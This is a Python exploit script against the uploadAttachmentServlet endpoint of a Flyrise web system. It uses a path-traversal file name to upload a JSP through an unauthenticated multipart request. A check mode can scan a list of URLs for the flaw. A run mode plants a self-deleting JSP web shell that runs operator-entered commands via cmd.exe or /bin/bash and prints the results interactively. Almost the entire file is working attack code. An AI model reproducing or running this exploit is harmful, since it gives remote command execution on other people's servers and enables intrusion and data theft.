import requests
import urllib3
import re,string,random
from urllib.parse import urljoin
import argparse
import time
import ssl
import urllib.request
ssl._create_default_https_context = ssl._create_unverified_context
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def read_file(file_path):
    with open(file_path, 'r') as file:
        urls = file.read().splitlines()
    return urls

def generate_random_string(length):
    characters = string.ascii_letters + string.digits
    random_string = ''.join(random.choice(characters) for _ in range(length))
    return random_string

def check(url):
    url = url.rstrip("/")
    target = urljoin(url,"/servlet/uploadAttachmentServlet")
    headers = {
        "User-Agent": "Mozilla/2.0 (compatible; MSIE 3.01; Windows 95",
        "Content-Type": "multipart/form-data; boundary=----WebKitFormBoundarygcflwtei"
    }

    filename = generate_random_string(6)
    context = generate_random_string(10)
    data = """------WebKitFormBoundarygcflwtei\r\nContent-Disposition: form-data; name="uploadFile"; filename="../../../../../jboss/web/fe.war/replace1.jsp"\r\nContent-Type: text/plain\r\n\r\n<% out.println("replace2");new java.io.File(application.getRealPath(request.getServletPath())).delete();%>\r\n------WebKitFormBoundarygcflwtei\r\nContent-Disposition: form-data; name="json"\r\n\r\n{"iq":{"query":{"UpdateType":"mail"}}}\r\n------WebKitFormBoundarygcflwtei--"""
    data = data.replace('replace1',filename).replace('replace2',context)
    try:
        response = requests.post(target, verify=False, headers=headers, data=data, timeout=15)
        if response.status_code == 200 and 'guid' in response.text and 'errorMessage' in response.text:
            result_url = url+'/{}.jsp;'.format(filename)
            response = urllib.request.Request(result_url, headers=headers, method="GET", unverifiable=True)
            res = urllib.request.urlopen(response)
            status_code = res.getcode()
            content = res.read().decode()
            if status_code == 200 and context in content:
                print(f"\033[31mDiscovered:{url}: FlyriseYYsystem_uploadAttachmentServlet_Fileupload\033[0m")
                return True
    except Exception as e:
        pass

def run(url):
    url = url.rstrip("/")
    target = urljoin(url, "/servlet/uploadAttachmentServlet")
    headers = {
        "User-Agent": "Mozilla/2.0 (compatible; MSIE 3.01; Windows 95",
        "Content-Type": "multipart/form-data; boundary=----WebKitFormBoundarygcflwtei"
    }
    proxy_support = urllib.request.ProxyHandler({"http": "http://127.0.0.1:8080", "https": "https://127.0.0.1:8080"})
    opener = urllib.request.build_opener(proxy_support)
    urllib.request.install_opener(opener)
    proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}
    if check(url):
        while True:
            command = input("\033[34mPlease input command (stop input:exit):\033[0m")
            if "exit" not in command:
                filename = generate_random_string(6)
                data = """------WebKitFormBoundarygcflwtei\r\nContent-Disposition: form-data; name="uploadFile"; filename="../../../../../jboss/web/fe.war/replace1.jsp"\r\nContent-Type: text/plain\r\n\r\n<%@ page language="java" contentType="text/html;charset=UTF-8" pageEncoding="UTF-8"%><%@ page import="java.io.*"%><%Process p=null;String  cmd = "command";String os = System.getProperty("os.name").toLowerCase();if (os.contains("windows")) {p =  Runtime.getRuntime().exec(new String[]{"cmd.exe","/c",cmd});}else{p = Runtime.getRuntime().exec(new String[]{"/bin/bash", "-c", cmd});}if(cmd != null){InputStream input = p.getInputStream();InputStreamReader ins = new InputStreamReader(input, "GBK");BufferedReader br = new BufferedReader(ins);out.print("<pre>");String line;while((line = br.readLine()) != null) {out.println(line);}out.print("</pre>");br.close();ins.close();input.close();p.getOutputStream().close();}new java.io.File(application.getRealPath(request.getServletPath())).delete();%>\r\n------WebKitFormBoundarygcflwtei\r\nContent-Disposition: form-data; name="json"\r\n\r\n{"iq":{"query":{"UpdateType":"mail"}}}\r\n------WebKitFormBoundarygcflwtei--"""
                data = data.replace('replace1', filename).replace('command',command)
                try:
                    response = requests.post(target, verify=False, headers=headers, data=data, timeout=15,proxies=proxies)
                    if response.status_code == 200 and 'guid' in response.text and 'errorMessage' in response.text:
                        result_url = url + '/{}.jsp;'.format(filename)
                        response = urllib.request.Request(result_url, headers=headers, method="GET", unverifiable=True)
                        res = urllib.request.urlopen(response)
                        status_code = res.getcode()
                        content = res.read().decode()
                        if status_code == 200:
                            print(content)
                except Exception as e:
                    pass
            else:
                break

if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument("-u", "--url", help="URL")
    parser.add_argument("-f", "--txt", help="file")
    args = parser.parse_args()
    url = args.url
    txt = args.txt
    if url:
        run(url)
    elif txt:
        urls = read_file(txt)
        for url in urls:
            check(url)
    else:
        print("help")